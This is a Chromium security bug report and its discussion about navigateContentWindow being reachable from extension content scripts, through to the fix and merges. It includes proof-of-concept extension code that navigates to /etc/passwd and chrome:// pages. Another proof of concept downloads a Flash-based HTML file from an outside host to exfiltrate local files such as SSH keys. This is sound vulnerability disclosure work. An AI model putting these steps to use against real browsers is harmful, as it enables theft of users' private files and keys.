# chrome.embeddedSearch.newTabPage.navigateContentWindow is too powerful

| Field | Value |
|-------|-------|
| **Issue ID** | [40082478](https://issues.chromium.org/issues/40082478) |
| **Status** | New |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Unknown |
| **CVE IDs** | CVE-2016-1625 |
| **Reporter** | ja...@googlemail.com |
| **Assignee** | dc...@chromium.org |
| **Created** | 2015-07-12 |
| **Bounty** | $1,000.00 |

## Description

UserAgent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36

Steps to reproduce the problem:
1. Add the following extension to chrome:
===== begin manifest.json =====
{
  "manifest_version": 2,
  "name": "evil newtab extension",
  "description": "This extension does evil stuff",
  "version": "1.0",
  "content_scripts": [
    { "matches": ["https://www.bing.com/chrome/newtab"], "js": ["evilcs.js"]}
  ]
}
=====  end  manifest.json =====

===== begin evilcs.js =====
setTimeout(function() {
  ['file:///etc/passwd', 'chrome://settings'].forEach(function(url) {
    chrome.embeddedSearch.newTabPage.navigateContentWindow(url, 9);
  })
}, 3000);
=====  end  evilcs.js =====

2. Change the search engine to Bing. (Because it looks like they don't have localized URLs for the new tab page.)
3. Open a new tab, wait three seconds.

What is the expected behavior?
In my opinion, chrome.embeddedSearch.newTabPage.navigateContentWindow() should not allow opening pages in incognito windows and should only permit navigation to web-accessible origins.

What went wrong?
Although the extension has no permissions that allow it to navigate to chrome: URIs, navigate to file: URIs or open windows in incognito mode, it did all three of those things.

Did this work before? N/A 

Chrome version: 43.0.2357.132  Channel: stable
OS Version: 
Flash Version: Shockwave Flash 18.0 r0

As far as I can tell, this could also be pulled off by a MITM attacker with a valid SSL cert for www.bing.com if the user has changed the search engine default because they're not in the HSTS preload list.

If Flash is enabled, the ability to navigate to file: URIs (combined with the ability to download one file to the local disk, but every webpage can do that) lets an attacker (slowly) exfiltrate the contents of files on the local filesystem (not the HTML5 local filesystem, the real one) - see bug #487475 for details.

## Attachments

- deleted (application/octet-stream, 0 B)
- [poc_fast.mkv](attachments/poc_fast.mkv) (application/octet-stream, 607.4 KB)

## Timeline

### ja...@googlemail.com (2015-07-12)

I made a nicer PoC. Install this extension in Chrome on Linux, then open the "new tab" page with any search engine configured:

manifest.json:
==========
{
  "manifest_version": 2,
  "name": "evil newtab extension",
  "description": "This extension does evil stuff",
  "version": "1.0",
  "content_scripts": [
    { "matches": ["https://*/"], "js": ["evilcs.js"]}
  ]
}
==========

evilcs.js:
==========
function forceDownload(path, name) {
  var e = document.createElement('a');
  e.download = name;
  e.href = path;
  document.body.appendChild(e);
  e.click();
  setTimeout(function() {
    document.body.removeChild(e);
  }, 10000);
}

if (chrome.embeddedSearch) {
  forceDownload('https://var.thejh.net/flash_abOygnalkAm2/writer_combined.html', 'writer_combined.html');
  setTimeout(function() {
    chrome.embeddedSearch.newTabPage.navigateContentWindow('file:///proc/self/cwd/Downloads/writer_combined.html', 2);
  }, 3000);
} else {
  console.log('no embeddedSearch present');
}
==========

Without further user interaction, after a few seconds, you should see characters from the /etc/passwd appear, about five seconds for a 35-byte line (in other words, about 18ms per bit) - with some minor errors. The private exponent of an RSA key is typically 2048-4096 bits long, so in something like 30-80 seconds, it should be possible to exfiltrate a whole private exponent, e.g. for an SSH key or a GPG key. (And it's probably possible to optimize this further quite a bit.)

As before, if the search engine in use doesn't use HSTS, this attack could be carried out by a MITM attacker who managed to obtain a valid cert for the search engine's domain.

I have attached sources for the exploit and a short video of what a successful attack looks like (with original speed).

### jl...@chromium.org (2015-07-12)

Ben, Devlin, could you looks into this? I will chat with you to assess severity.

### ja...@googlemail.com (2015-07-13)

Given that bug #429838 was a similar issue - not checking for whether a URL is web-accessible before accessing it -, maybe it would make sense to modify the URL parsing code and add options for specifying which non-web-accessible protocols/origins may be parsed, defaulting to "nothing"? That way, you can't accidentally forget to check for it.

### [Deleted User] (2015-07-13)

Well, a bug appears to be that the any user code can access "chrome.embeddedSearch.newTabPage.navigateContentWindow". This is not an extension API, it's a v8 API which is injected if the process has the "kInstantProcess" command line switch:

https://code.google.com/p/chromium/codesearch#chromium/src/chrome/renderer/chrome_content_renderer_client.cc&q=searchboxextension%20file:chrome_content_renderer_client.cc

This shouldn't be allowed to happen. The API shouldn't be injected into the renderer in the first place, and site isolation should prevent it from executing on the browser[*]

The fact that Extension code can then access those functions implies that either that v8 API is injected into all isolated worlds (i.e. Chrome extension isolated world + main world) *or* that setTimeout somehow breaks out of the Chrome extension's isolated world. I would hope not that latter, since we almost certainly test for that.

Also note:

> "Although the extension has no permissions that allow it to navigate to chrome: URIs, navigate to file: URIs or open windows in incognito mode, it did all three of those things."

Nit: there is nothing actually stopping extensions from *navigating* to chrome: URLs, file: URLs, or incognito pages using the chrome.tabs API. However, they should never-ever be able to *execute code* on chrome: URLs, and they should only be allow to execute code on file: URLs and incognito pages if they've been allowed to (by ticking the corresponding checkbox) in chrome://extensions.


[*] though this unfortunately may imply blocking extension content scripts on the default NTP, which I don't think we do right now? I can't remember.

### [Deleted User] (2015-07-13)

^ attempting to CC the instant people from revision list of chrome/renderer/searchbox/searchbox_extension.h. 

### ja...@googlemail.com (2015-07-13)

> Nit: there is nothing actually stopping extensions from *navigating* to chrome: URLs, file: URLs, or incognito pages using the chrome.tabs API. However, they should never-ever be able to *execute code* on chrome: URLs, and they should only be allow to execute code on file: URLs and incognito pages if they've been allowed to (by ticking the corresponding checkbox) in chrome://extensions.

Ouch. So using the "download, then navigate to it" trick, an extension can effectively run code on file:// by design. IMO, that's not so great, especially combined with that also-by-design behavior in flash. :/ And by doing the download in a new window that is then immediately destroyed, the fact that a download happened can be hidden from the user. In effect, this makes it possible for an extension without any permissions to do things like stealing cookies and passwords from arbitrary pages, right? By chaining by-design issues?

Still, this also allows a MITM attacker with a cert for bing or so to execute on file://. I'm assuming that that is a (low-severity) issue to you?

### [Deleted User] (2015-07-13)

> an extension can effectively run code on file:// by design

How does that work?

> I'm assuming that that is a (low-severity) issue to you?

jln?

### [Deleted User] (2015-07-13)

[Empty comment from Monorail migration]

### ja...@googlemail.com (2015-07-13)

>> an extension can effectively run code on file:// by design
> How does that work?

Like my PoC does it. Download an HTML page, navigate to the downloaded file. And if the downloaded file has embedded flash, you can then proceed to dump the contents of arbitrary local files and upload them to the web, like my PoC does it.

You can't run code on *specific* file:// URIs with that, but I don't think that makes much of a difference if you can dump their sourcecode? Local storage is shared across all file:// URLs, cookies are disabled.

### jl...@chromium.org (2015-07-13)

This whole thing smells bad to me. There seems to be a number of brittle things at play. In general I'm unhappy with our handling of file:// which is too relaxed.

Adding a couple of site isolation experts. Charlie, could you help assigning this?

### jl...@chromium.org (2015-07-13)

[Empty comment from Monorail migration]

### dc...@chromium.org (2015-07-13)

> Well, a bug appears to be that the any user code can access "chrome.embeddedSearch.newTabPage.navigateContentWindow". This is not an extension API, it's a v8 API which is injected if the process has the "kInstantProcess" command line switch:

Actually, when you register a v8 extension, it gets injected into all worlds: see WindowProxy::createContext.

To make sure I understand, let me try to summarize the problem(s):
1) Instant search (1993) allows you to set a custom NTP.
2) Navigating to the custom NTP marks the renderer as an instant process.
3) Since the renderer is instant, we inject the v8 extension that implements chrome.embeddedSearch.
4) Content scripts can inject themselves into instant search pages, thus getting access to chrome.embeddedSearch as a result.
5) This content script can download a page which is both simultaneously HTML and Flash (!!!)
6) The content script navigates to the downloaded copy (I guess this is harder on Windows)
7) Flash, being Flash, can read arbitrary files.

Is this accurate?

### ja...@googlemail.com (2015-07-14)

> Is this accurate?

Looks correct to me.

### jl...@chromium.org (2015-07-14)

[Empty comment from Monorail migration]

### [Deleted User] (2015-07-14)

#12 -

At step (4) it sounds like there is a separate but related problem where any default NTP search engine has access to chrome.embeddedSearch.newTabPage.navigateContentWindow, by design, and there should be browser checks to ensure that it can't navigate to file:// URLs? By fixing that it would automatically fix the extension problem?

### dc...@chromium.org (2015-07-14)

As far as I can tell, navigateContentWindow was a workaround to the fact that web content can't normally navigate to a file:// URL. Since one of your most visited pages might be a file:// URL, navigateContentWindow explicitly can do this: https://code.google.com/p/chromium/codesearch#chromium/src/chrome/browser/resources/local_ntp/most_visited_util.js&l=153

### cr...@chromium.org (2015-07-14)

Ok, there's a few issues here that sound like they need to be resolved, spanning Flash, Instant (NTP), and extension content scripts.

1) The ability to download a page and then navigate to it via a file:// URL is allowing file exfiltration, thanks to Flash's security model.  See the writer_combined.html file in https://crbug.com/chromium/509313#c2.
I don't think that's possible using just an HTML and JavaScript file, since different file:// URLs are treated cross-origin.  Since Flash appears to allow it, perhaps we should make Flash click-to-play by default on file:// URLs?  Adding jschuh@ and wfh@ for opinions.

2) navigateContentWindow is too powerful.
This was introduced to the Embedded Search API (https://dev.chromium.org/embeddedsearch) in https://crbug.com/chromium/164237, and while the discussion on that bug identified that it was security sensitive, I don't see the outcome of the security discussion there.  As dcheng@ noted in https://crbug.com/chromium/509313#c16, the API was added because Most Visited tiles might point to chrome:// or file:// URLs, and navigation to those URLs by web pages are normally disallowed (for a good reason).  If that's the use of the API, then it's way too general-- it shouldn't allow navigating to arbitrary URLs, but only ones that are actually in the Most Visited tiles, as determined by the browser process.  Fixing this might be a breaking API change, but it seems worth doing.  (Maybe we can just validate the URLs that are passed, rather than changing the API to specify an identifier for a Most Visited result?)  It's currently far too powerful for an API exposed to web content, even if it's web content that the user picked as their search engine.  @samarth/@beaudoin: Is this change possible?

3) Content scripts can use the navigateContentWindow API.
As kalman@ pointed out in https://crbug.com/chromium/509313#c4, extensions can already use the chrome.tabs API to navigate to chrome:// and file:// URLs, so fixing the Flash issue in (1) seems important.  However, content scripts wouldn't normally have access to those APIs, and giving them access to navigateContentWindow seems like an unnecessary increase in power.  @dcheng, is it possible to change WindowProxy::createContext or something related so that the API is only injected into the main world and not the isolated worlds of content scripts?  @kalman, is that a useful thing to do for the extension security model?

If these things sound reasonable, we should file individual bugs for them and mark them as blocking this one.

### ja...@googlemail.com (2015-07-14)

Regarding number 3: Wouldn't a content script still be able to inject a <script> tag into the document, which would then run in a context with access to the API? Try running this in the dev console of a page (like the new tab page), in the context of an extension:

var el=document.createElement('script');el.setAttribute('src','data:,alert("in extension context: "+!!chrome.extension)');document.head.appendChild(el)

You'll get an alert with "in extension context: false".

It's a bit more heavy-handed, but would completely banning content scripts in processes with the privileged API work? Is there a real use for extensions on the "new tab" page?

### [Deleted User] (2015-07-14)

> @kalman, is that a useful thing to do for the extension security model?

Unfortunately, not really. It's easy enough to jump to the main world for an extension. The only sure solution I can think of is just blocking extensions from these embedded search processes, and I'd like to avoid that if possible.

### [Deleted User] (2015-07-14)

#18's comment is very similar to my own. As for the use case for extension on the new tab page, I just like that any extension which changes google.com to have a bing-style image background (or whatever - just an arbitrary example) would also apply to the NTP.

On the other hand this would be a workaround for an extension installing itself (and e.g. showing adds) on the default new tab page without telling us, so there is an argument for blocking it.

I think it's orthogonal to this discussion for now. Fixing creis' 1 & 2 addresses the underlying problem causing this bug.

### js...@chromium.org (2015-07-14)

We have https://crbug.com/chromium/475627 filed to block Flash from loading by default for local origins, but it hasn't been prioritized. The rest of the proposed fixes sound good to me.

### ja...@googlemail.com (2015-07-14)

> 1) The ability to download a page and then navigate to it via a file:// URL is allowing file exfiltration, thanks to Flash's security model.  See the writer_combined.html file in https://crbug.com/chromium/509313#c2.
> I don't think that's possible using just an HTML and JavaScript file, since different file:// URLs are treated cross-origin.  Since Flash appears to allow it, perhaps we should make Flash click-to-play by default on file:// URLs?  Adding jschuh@ and wfh@ for opinions.

#487475 already is a bug on pretty much that, apart from my new PoC being faster.

### cr...@chromium.org (2015-07-14)

Yes, let's drop (3) and focus on (1) and (2).  If Flash is click-to-play for file:// and navigateContentWindow is limited to URLs that actually show up in Most Visited, that should help.

@wfh, if (1) sounds good, can you own or find an owner?

@samarth, if (2) sounds good, can you own or find an owner?

### cr...@chromium.org (2015-07-14)

https://crbug.com/chromium/509313#c21: Great.  I'll list https://crbug.com/chromium/475627 as blocking this.

### cr...@chromium.org (2015-07-15)

@kmadhusu: Can you take a look at https://crbug.com/chromium/509313#c17 and respond about (2)?  We're concerned about navigateContentWindow.  Thanks!

### km...@chromium.org (2015-07-15)

cc'ing mostlikely code owners to comment about the solution specified in (17).

### je...@chromium.org (2015-07-15)

Yeah, we should nerf navigateContentWindow. I thought we already did this tbh.

Also, we should consider disallowing content scripts on the Instant ntp (is that possible?) Honestly, the best use case I can think of for such a thing is to steal queries or hijack someone's dse. I think users who want a custom ntp experience are better served by extensions which replace the ntp entirely. Is there a good product case for allowing these content scripts?

### cr...@chromium.org (2015-07-15)

@jered: Thanks.  It sounds like there may have been a previous bug where that was proposed?

As for content scripts in the Instant process, I tend to use accessibility as a good yardstick.  There may be good reasons (e.g., improving contrast, etc) for extensions to operate on that content, though I agree that the fact that the process is privileged is important to weigh against.

### je...@chromium.org (2015-07-15)

Yes, please see https://crbug.com/chromium/386988, navigateContentWindow was previously part of a sandbox escape. We broke the chain elsewhere but I thought we were also going to modify it to accept only a whitelist of filesystem urls from most visited.

The Instant API model really assumes we control the content which has access to it. For example, previously, we decided to turn Instant off for users pinned to HTTP; the ntp falls back to a locally served page, chrome-search://local-ntp, in part because we were concerned about intrusive captive portals or other injection attacks. Accessibility is a valid concern, but the dse-provided ntp supports themes for contrast, and tries to do a good job with aria markup etc... on balance, it may be better to think of this the same way as http and have Instant turn itself off here.

### sa...@chromium.org (2015-07-15)

[This is all from memory so we should verify]
IIRC, we could _almost_ get rid of navigateContentWindow at one point, but there were a couple of reasons we couldn't.  The iframes themselves are in the chrome:// scheme so I think regular clicks on them could be allowed to navigate to chrome* URLs.  The problem is for a11y, we need to support keyboard navigation and that happens in the NTP page, not the iframe.

FWIW, I like the solution of restricting to known most visited URLs.  That technically breaks the API but I think that's fine (we should just give the only other user, Bing, a heads up).  That really should be how we did this in the first place.

### cr...@chromium.org (2015-07-15)

Great.  I'll assign this to jered@ for implementing that portion.  (Thanks for the pointer to https://crbug.com/chromium/386988.  For reference, this idea was discussed on https://crbug.com/chromium/387033 but fell between the cracks when that bug was closed in https://crbug.com/chromium/509313#c21.)

As for content scripts, I'll defer to kalman@.  Things like ChromeVox are another example that an NTP theme wouldn't help with, but turning off Instant when a content script applies is another option.

### je...@chromium.org (2015-07-16)

Actually I think mathp@ has much, much better state than me... just bikeshedding/providing history here. :-)

### fs...@chromium.org (2015-07-16)

@samarth: the new single-iframe gets clicked directly from the chrome:// iframe, not from the page (both for keyboard navigation or click), so navigateContentWindow is never called to begin with.

We still support the old schema (with navigateContentWindow) for cases where people replace the default NTP (like Bing?) and still keep the old suggestions. Maybe we should revisit that, drop support for old iframes and just ditch the function?

### cl...@chromium.org (2015-07-17)

[Empty comment from Monorail migration]

### wf...@chromium.org (2015-07-20)

[Empty comment from Monorail migration]

### ma...@chromium.org (2015-07-20)

[Empty comment from Monorail migration]

### fs...@chromium.org (2015-07-23)

Just to update my position on this.
We still do use navigateContentWindow to support Most Visited NTP file:// suggestions.
But I'd be willing to talk about changing this.

### pa...@chromium.org (2015-10-26)

[Empty comment from Monorail migration]

### cr...@chromium.org (2015-10-27)

[Empty comment from Monorail migration]

### dc...@chromium.org (2016-02-02)

[Empty comment from Monorail migration]

### dc...@chromium.org (2016-02-02)

|navigateContentWindow| has been abused again as part of another exploit: this one is a full-chain sandbox escape. Can we prioritize fixing this to at least use a whitelist ASAP?

### pa...@chromium.org (2016-02-02)

Bumping priority and giving it a milestone, given its age and importance. fserb, if you are not the right person to handle this, can you please help us find someone who is? Thanks!

### ne...@chromium.org (2016-02-03)

[Empty comment from Monorail migration]

### cr...@chromium.org (2016-02-03)

[Empty comment from Monorail migration]

### rs...@chromium.org (2016-02-04)

It looks like navigateContentWindow() is only used for navigating to an NTP Most Visited tile. The implementation for NavigateContentWindow already has an ability to navigate based on a "restricted id" (rid), which is basically an index into the Most Visited sites list. If the requested navigation is a RID, then it looks up the URL in the table and navigates to that. Otherwise, it navigates to the arbitrary URL specified by the caller.

Can we not just kill off that "else" branch allowing arbitrary navigations, and only allow this method to navigate to an RID. That way the set of potential destination URLs is controlled by the renderer, not JavaScript?

https://code.google.com/p/chromium/codesearch#chromium/src/chrome/renderer/searchbox/searchbox_extension.cc&q=navigateContentWindow&sq=package:chromium&l=1158&dr=CSs

### dc...@chromium.org (2016-02-04)

Sadly I just did some experiments with google.com and bing.com (the only other instant implementation I know of)... and both of them are using the string version of the call.

For now, maybe we can implement a dumb, linear search whitelist, with explicit guards against things that should never appear like chrome://, chrome-extension://, and more?

### dc...@chromium.org (2016-02-04)

[Empty comment from Monorail migration]

### rs...@chromium.org (2016-02-04)

I support checking string navigations against the most visited list and only permitting those navigations (the cache is 100 items, so linear search should be fine). NavigateContentWindow() already prohibits to javascript:// navigations, so explicitly banning chrome:// and chrome-extension:// seems reasonable too.

### in...@chromium.org (2016-02-04)

Severity was incorrectly tagged in this bug due to lack of PoC.

Raising the priority and severity of the bug based on availability of exploit in https://code.google.com/p/chromium/issues/detail?id=583431 (external report).  Please look into this issue asap and provide an ETA estimate for the fix. If you are not the right owner, please help to find one.

### in...@chromium.org (2016-02-04)

[Empty comment from Monorail migration]

### js...@chromium.org (2016-02-04)

I agree that this was underrated at low-severity, but I don't see the argument for high. A UXSS was necessary both to get access to the API and to then inject the payload into a more privileged context. The API itself just granted an overly privileged navigation primitive from an already privileged context.

Is it bad? Absolutely. But, not a high-severity vulnerability on its own. Were it available to the Web directly, it would definitely be high-severity. But, that's not the case here, since setting default search is akin to being able to install an extension.

### dc...@chromium.org (2016-02-04)

https://codereview.chromium.org/1669723002 should mitigate this by adding a check that the URL is actually on the most visited list.

However, I'm hoping we can still further limit the scope of this IPC by requiring callers to use the RID, rather than passing the URL as they do today.

### ne...@chromium.org (2016-02-04)

[Empty comment from Monorail migration]

### fi...@chromium.org (2016-02-04)

[Empty comment from Monorail migration]

### fi...@chromium.org (2016-02-04)

[Empty comment from Monorail migration]

### cr...@chromium.org (2016-02-04)

Daniel has a CL in progress (with much discussion) here: https://codereview.chromium.org/1669723002/

### cr...@chromium.org (2016-02-04)

Comment from Samarth about the history of the API (from the CL in #56):

"There's a long history behind NavigateContentWindow.

In the beginning, this API was meant to be used both for most visited items as
well as for suggestions in the HTML-based omnibox popup.  The latter never
launched.  In the suggest case, you could definitely end up with chrome:// URLs
in the suggestions and this API provided a way for the HTML omnibox popup to
navigate to those URLs when the user selected those suggestions.  The comment
here probably dates to that use case.

At this point, we only need NCW for most visited/most likely so it can much more
limited.  Even better, each most visited item is rendered as regular links
inside chrome-search:// iframes, so you might wonder why we need this API at
all.  I think there are three issues:
1) For a11y, we need to support keyboard navigation.  That logic is still in the
JS in the NTP so it needs a way to trigger navigations.
2) You can't arbitrarily link to privileged URLs like chrome://.  Though, it
might be better to allow chrome-search:// to link to these URLs rather than make
NCW to support it.
3) With MostLikely, the browser didn't actually have knowledge of what the URLs
were so you couldn't just have a RID-based NCW.  Sounds like this is changing
from Mathieu's reply earlier.

So the summary of all of this I think is that if change that Mathieu alluded to
earlier is done, we should at least get rid of the URL-based NCW and only have a
RID version.  It's also potentially feasible to kill this altogether and just
have them be regular links but that will require more changes to make sure we
don't break a11y.

In the short term, unfortunately, I don't know what URLs can and can not enter
Most Visited/Likely.  But I'm pretty sure that comment was not added to
specifically deal with that case.

Thanks,
Samarth"

### cr...@chromium.org (2016-02-04)

I think we'll start with a CL that limits navigateContentWindow to known URLs and that blocks all chrome:// URLs, since those pose a large security risk and we don't think they're needed in practice.  That should be safe to merge.

We can follow up with limiting to the RID version or possibly removing it altogether.

### cr...@chromium.org (2016-02-04)

CC'ing newer NTP team members directly, because we'll need some help with the follow up tasks.

### bu...@chromium.org (2016-02-04)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/d523a41aed4e321d4c8197b5cccb73be23c8dcc2

commit d523a41aed4e321d4c8197b5cccb73be23c8dcc2
Author: dcheng <dcheng@chromium.org>
Date: Thu Feb 04 20:06:12 2016

NTP: don't allow navigateContentWindow to navigate where it pleases.

BUG=509313

Review URL: https://codereview.chromium.org/1669723002

Cr-Commit-Position: refs/heads/master@{#373598}

[modify] http://crrev.com/d523a41aed4e321d4c8197b5cccb73be23c8dcc2/chrome/browser/search/instant_service.cc
[modify] http://crrev.com/d523a41aed4e321d4c8197b5cccb73be23c8dcc2/chrome/browser/search/instant_service.h
[modify] http://crrev.com/d523a41aed4e321d4c8197b5cccb73be23c8dcc2/chrome/browser/search/instant_service_unittest.cc
[modify] http://crrev.com/d523a41aed4e321d4c8197b5cccb73be23c8dcc2/chrome/browser/ui/search/search_tab_helper.cc
[modify] http://crrev.com/d523a41aed4e321d4c8197b5cccb73be23c8dcc2/chrome/renderer/searchbox/searchbox_extension.cc


### mp...@chromium.org (2016-02-04)

-mpearson
(I deal only with the omnibox, not the NTP.)


### in...@chromium.org (2016-02-04)

Daniel, ok to merge this. Any M48 change need to be merged before tmrw afternoon.

### cl...@chromium.org (2016-02-04)

Please mark security bugs as fixed as soon as the fix lands, and before requesting merges.

- Your friendly ClusterFuzz

### cl...@chromium.org (2016-02-04)

[Empty comment from Monorail migration]

### sa...@chromium.org (2016-02-04)

IMO, it would be good to sanity check that this doesn't break Most Likely (not Visited) before merging.  (See the last comments by jered@ and mathp@ on the review thread.)

### je...@chromium.org (2016-02-04)

+mathp are there server-side controls to disable most likely in the event that we need to merge, so that users don't see a broken state?

### ma...@chromium.org (2016-02-04)

Hmm, Most Likely is on by default. Note that the navigateContentWindow API is only used for keyboard navigation (as samarth pointed out). So I'm pretty sure the normal click behavior (<a> tags) will not break, but keyboard navigation might.

### dc...@chromium.org (2016-02-04)

I have no idea how to test Most Likely: is it easy?

### ma...@chromium.org (2016-02-04)

Log in to chrome itself (not just the content area) with a google account that has enough synced history. If the tiles you see on the NTP are the same you see at https://www.google.com/chromesuggestions, then you're getting Most Likely. 

### dc...@chromium.org (2016-02-04)

With the disclaimer that I honestly don't know if I'm testing the right thing... it seems to work for me?

### hu...@chromium.org (2016-02-04)

If Most Likely breaks then would fall back to local NTP (chrome-search://local-ntp/local-ntp.html). You can also compare the regular NTP against local NTP, and if they're suspiciously identical then most likely something broke.

### ma...@chromium.org (2016-02-04)

huangs: Not necessarily in this case because we are talking about a navigation API that would stop working. So the ML tiles can be there, but keyboard navigation would break, for example.

### dc...@chromium.org (2016-02-04)

If this is a failure mode we're worried about, can someone who's familiar with Most Likely verify this change?

### dc...@chromium.org (2016-02-04)

Note: I've filed https://crbug.com/chromium/584461 to track the followup work for hardening this API more.

### tr...@chromium.org (2016-02-05)

As far as I can tell, MostLikely including keyboard navigation continues to work fine after this patch. That's because (again, as far as I can tell) MostLikely doesn't ever use navigateContentWindow - only MostVisited does, and that is handled in this patch by whitelisting the |most_visited_items_|.

Since I'm not very familiar with any of this yet, I'd be more comfortable if mathp could run another verification pass before merging this to stable. Mathieu, do you mind? :)

### ma...@chromium.org (2016-02-05)

Tested Most Likely including keyboard navigations, and it appears to work well. Thanks!

### ne...@chromium.org (2016-02-05)

Thanks for verifying!

### ja...@googlemail.com (2016-02-05)

(I just removed the PoC sourcecode and killed the PoC link to prevent them from becoming public when the bug is unrestricted.)

### na...@chromium.org (2016-02-05)

jannhorn@, the Chrome security team operates entirely in the open and PoCs are kept intact in bug reports. There is a delay before making the reports public.

### ja...@googlemail.com (2016-02-05)

@nasko: I know that there is a delay before bug publication, and I know that PoCs are normally kept public. However, for the side-channel data-leaking attack on Flash that probably isn't going to be fixed soon, I have already posted a super-slow PoC that is sufficient to demonstrate the https://crbug.com/chromium/8 months ago (http://seclists.org/fulldisclosure/2015/May/122), and I don't see the point in making a faster version of it public.

### ti...@google.com (2016-02-05)

Merge approved for M48 (branch 2564). Pls merge asap - by 4pm this Fri to catch up with next stable refresh. Thanks.

### ne...@chromium.org (2016-02-05)

ACK, Daniel is aware. Thanks!

### bu...@chromium.org (2016-02-05)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/35bd0d816ccd2b35f79e62f9c551dcb04e3da055

commit 35bd0d816ccd2b35f79e62f9c551dcb04e3da055
Author: Daniel Cheng <dcheng@chromium.org>
Date: Fri Feb 05 19:27:05 2016

NTP: don't allow navigateContentWindow to navigate where it pleases.

BUG=509313

Review URL: https://codereview.chromium.org/1669723002

Cr-Commit-Position: refs/heads/master@{#373598}
(cherry picked from commit d523a41aed4e321d4c8197b5cccb73be23c8dcc2)

R=rsesek@chromium.org

Review URL: https://codereview.chromium.org/1676583002 .

Cr-Commit-Position: refs/branch-heads/2564@{#675}
Cr-Branched-From: 1283eca15bd9f772387f75241576cde7bdec7f54-refs/heads/master@{#359700}

[modify] http://crrev.com/35bd0d816ccd2b35f79e62f9c551dcb04e3da055/chrome/browser/search/instant_service.cc
[modify] http://crrev.com/35bd0d816ccd2b35f79e62f9c551dcb04e3da055/chrome/browser/search/instant_service.h
[modify] http://crrev.com/35bd0d816ccd2b35f79e62f9c551dcb04e3da055/chrome/browser/search/instant_service_unittest.cc
[modify] http://crrev.com/35bd0d816ccd2b35f79e62f9c551dcb04e3da055/chrome/browser/ui/search/search_tab_helper.cc
[modify] http://crrev.com/35bd0d816ccd2b35f79e62f9c551dcb04e3da055/chrome/renderer/searchbox/searchbox_extension.cc


### bu...@chromium.org (2016-02-05)

The following revision refers to this bug:
  https://chrome-internal.googlesource.com/bling/chromium.git/+/35bd0d816ccd2b35f79e62f9c551dcb04e3da055

commit 35bd0d816ccd2b35f79e62f9c551dcb04e3da055
Author: Daniel Cheng <dcheng@chromium.org>
Date: Fri Feb 05 19:27:05 2016


### dc...@chromium.org (2016-02-06)

[Empty comment from Monorail migration]

### ti...@google.com (2016-02-08)

@sshruthi - please approve for M49 as well.

### ss...@google.com (2016-02-08)

Merge Approved for M49 (branch 2623)

### go...@chromium.org (2016-02-08)

Please merge your change to M49 (branch: 2623) before 5:00 PM PST tomorrow,Tuesday [02/09] if order to make it to M49 Beta push on Wednesday [02/10].

### bu...@chromium.org (2016-02-09)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/39cb21f9c698231abb836b1dfb2bb6f31e8416f4

commit 39cb21f9c698231abb836b1dfb2bb6f31e8416f4
Author: Daniel Cheng <dcheng@chromium.org>
Date: Tue Feb 09 00:50:05 2016

NTP: don't allow navigateContentWindow to navigate where it pleases.

BUG=509313

Review URL: https://codereview.chromium.org/1669723002

Cr-Commit-Position: refs/heads/master@{#373598}
(cherry picked from commit d523a41aed4e321d4c8197b5cccb73be23c8dcc2)

Review URL: https://codereview.chromium.org/1674303003 .

Cr-Commit-Position: refs/branch-heads/2623@{#315}
Cr-Branched-From: 92d77538a86529ca35f9220bd3cd512cbea1f086-refs/heads/master@{#369907}

[modify] http://crrev.com/39cb21f9c698231abb836b1dfb2bb6f31e8416f4/chrome/browser/search/instant_service.cc
[modify] http://crrev.com/39cb21f9c698231abb836b1dfb2bb6f31e8416f4/chrome/browser/search/instant_service.h
[modify] http://crrev.com/39cb21f9c698231abb836b1dfb2bb6f31e8416f4/chrome/browser/search/instant_service_unittest.cc
[modify] http://crrev.com/39cb21f9c698231abb836b1dfb2bb6f31e8416f4/chrome/browser/ui/search/search_tab_helper.cc
[modify] http://crrev.com/39cb21f9c698231abb836b1dfb2bb6f31e8416f4/chrome/renderer/searchbox/searchbox_extension.cc


### bu...@chromium.org (2016-02-09)

The following revision refers to this bug:
  https://chrome-internal.googlesource.com/bling/chromium.git/+/39cb21f9c698231abb836b1dfb2bb6f31e8416f4

commit 39cb21f9c698231abb836b1dfb2bb6f31e8416f4
Author: Daniel Cheng <dcheng@chromium.org>
Date: Tue Feb 09 00:50:05 2016


### ti...@google.com (2016-02-09)

Congrats Jann - $1,000 for this report (lower amount due to the constraints of exploitation).

Another CVE for your collection: CVE-2016-1625

### ti...@google.com (2016-03-12)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-05-13)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/509313?no_tracker_redirect=1

[Monorail blocked-on: crbug.com/chromium/475627]
[Monorail blocking: crbug.com/chromium/583431]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40082478)*
